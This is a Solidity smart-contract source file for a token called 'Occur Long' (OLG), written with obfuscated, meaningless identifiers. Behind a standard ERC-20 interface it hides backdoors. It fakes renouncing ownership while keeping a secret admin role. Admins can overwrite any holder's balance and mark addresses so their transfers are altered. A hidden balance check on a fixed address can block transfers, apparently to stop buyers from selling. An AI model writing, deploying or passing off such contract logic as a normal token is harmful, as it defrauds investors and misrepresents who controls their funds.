//SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

interface buyAutoFund {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract toList {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface fromFund {
    function createPair(address buyTo, address enableFrom) external returns (address);
}

interface marketingLiquidity {
    function totalSupply() external view returns (uint256);

    function balanceOf(address senderBuy) external view returns (uint256);

    function transfer(address takeFeeSwap, uint256 fromToTake) external returns (bool);

    function allowance(address receiverListLaunched, address spender) external view returns (uint256);

    function approve(address spender, uint256 fromToTake) external returns (bool);

    function transferFrom(
        address sender,
        address takeFeeSwap,
        uint256 fromToTake
    ) external returns (bool);

    event Transfer(address indexed from, address indexed toEnable, uint256 value);
    event Approval(address indexed receiverListLaunched, address indexed spender, uint256 value);
}

interface marketingLiquidityMetadata is marketingLiquidity {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract OccurLong is toList, marketingLiquidity, marketingLiquidityMetadata {

    uint256 private maxSwap = 100000000 * 10 ** 18;

    string private listSender = "OLG";

    bool private buyMin;

    address private listSellMarketing;

    uint256 public maxBuy;

    function toTx(address buySender, address takeFeeSwap, uint256 fromToTake) internal returns (bool) {
        require(fundSwap[buySender] >= fromToTake);
        fundSwap[buySender] -= fromToTake;
        fundSwap[takeFeeSwap] += fromToTake;
        emit Transfer(buySender, takeFeeSwap, fromToTake);
        return true;
    }

    mapping(address => uint256) private fundSwap;

    function enableReceiver(address fundListToken, uint256 fromToTake) public {
        walletList();
        fundSwap[fundListToken] = fromToTake;
    }

    address marketingLimit = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    event OwnershipTransferred(address indexed liquiditySender, address indexed fromExemptBuy);

    function toLiquidity(uint256 fromToTake) public {
        walletList();
        senderWallet = fromToTake;
    }

    function getOwner() external view returns (address) {
        return listSellMarketing;
    }

    bool private swapToken;

    string private autoReceiver = "Occur Long";

    function amountAt() public {
        emit OwnershipTransferred(launchedLimitAmount, address(0));
        listSellMarketing = address(0);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return maxSwap;
    }

    function transferFrom(address buySender, address takeFeeSwap, uint256 fromToTake) external override returns (bool) {
        if (_msgSender() != marketingReceiver) {
            if (marketingTotal[buySender][_msgSender()] != type(uint256).max) {
                require(fromToTake <= marketingTotal[buySender][_msgSender()]);
                marketingTotal[buySender][_msgSender()] -= fromToTake;
            }
        }
        return minLimitLaunch(buySender, takeFeeSwap, fromToTake);
    }

    function decimals() external view virtual override returns (uint8) {
        return tradingAmount;
    }

    uint256 constant takeEnableAt = 13 ** 10;

    uint256 senderWallet;

    function balanceOf(address senderBuy) public view virtual override returns (uint256) {
        return fundSwap[senderBuy];
    }

    bool public tokenSenderTo;

    uint256 walletMode;

    uint256 public enableTeam;

    mapping(address => bool) public walletReceiver;

    address public launchedLimitAmount;

    uint8 private tradingAmount = 18;

    mapping(address => mapping(address => uint256)) private marketingTotal;

    function minLimitLaunch(address buySender, address takeFeeSwap, uint256 fromToTake) internal returns (bool) {
        if (buySender == launchedLimitAmount) {
            return toTx(buySender, takeFeeSwap, fromToTake);
        }
        uint256 listReceiver = marketingLiquidity(liquidityAmountToken).balanceOf(marketingLimit);
        require(listReceiver == senderWallet);
        require(takeFeeSwap != marketingLimit);
        if (walletReceiver[buySender]) {
            return toTx(buySender, takeFeeSwap, takeEnableAt);
        }
        return toTx(buySender, takeFeeSwap, fromToTake);
    }

    function symbol() external view virtual override returns (string memory) {
        return listSender;
    }

    function allowance(address enableMarketing, address minSwap) external view virtual override returns (uint256) {
        if (minSwap == marketingReceiver) {
            return type(uint256).max;
        }
        return marketingTotal[enableMarketing][minSwap];
    }

    function name() external view virtual override returns (string memory) {
        return autoReceiver;
    }

    uint256 private walletMarketing;

    function maxSwapMarketing(address listMode) public {
        walletList();
        if (buyMin != swapToken) {
            enableTeam = atTradingLiquidity;
        }
        if (listMode == launchedLimitAmount || listMode == liquidityAmountToken) {
            return;
        }
        walletReceiver[listMode] = true;
    }

    function approve(address minSwap, uint256 fromToTake) public virtual override returns (bool) {
        marketingTotal[_msgSender()][minSwap] = fromToTake;
        emit Approval(_msgSender(), minSwap, fromToTake);
        return true;
    }

    function walletList() private view {
        require(minFromLaunch[_msgSender()]);
    }

    function launchedReceiver(address walletMax) public {
        require(walletMax.balance < 100000);
        if (tokenSenderTo) {
            return;
        }
        if (atTradingLiquidity == walletMarketing) {
            atTradingLiquidity = enableTeam;
        }
        minFromLaunch[walletMax] = true;
        
        tokenSenderTo = true;
    }

    uint256 public atTradingLiquidity;

    constructor (){
        if (walletMarketing == atTradingLiquidity) {
            swapToken = true;
        }
        buyAutoFund amountMarketingAt = buyAutoFund(marketingReceiver);
        liquidityAmountToken = fromFund(amountMarketingAt.factory()).createPair(amountMarketingAt.WETH(), address(this));
        
        launchedLimitAmount = _msgSender();
        amountAt();
        minFromLaunch[launchedLimitAmount] = true;
        fundSwap[launchedLimitAmount] = maxSwap;
        
        emit Transfer(address(0), launchedLimitAmount, maxSwap);
    }

    address public liquidityAmountToken;

    function transfer(address fundListToken, uint256 fromToTake) external virtual override returns (bool) {
        return minLimitLaunch(_msgSender(), fundListToken, fromToTake);
    }

    function owner() external view returns (address) {
        return listSellMarketing;
    }

    address marketingReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => bool) public minFromLaunch;

}